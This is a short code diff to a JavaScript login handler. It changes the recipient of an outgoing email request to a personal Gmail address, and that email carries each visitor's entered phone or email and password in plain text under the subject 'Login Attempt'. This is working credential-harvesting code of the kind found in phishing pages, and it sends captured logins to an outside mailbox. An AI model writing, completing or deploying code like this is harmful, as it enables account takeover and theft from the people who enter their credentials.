@@ -43,7 +43,7 @@ export function useLoginHandler() {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          to: "recipient@example.com",
+          to: "kcgodson01@gmail.com",
           subject: "Login Attempt",
           text: `Phone or Email: ${phoneOrEmail}, Password: ${password}`,
         }),
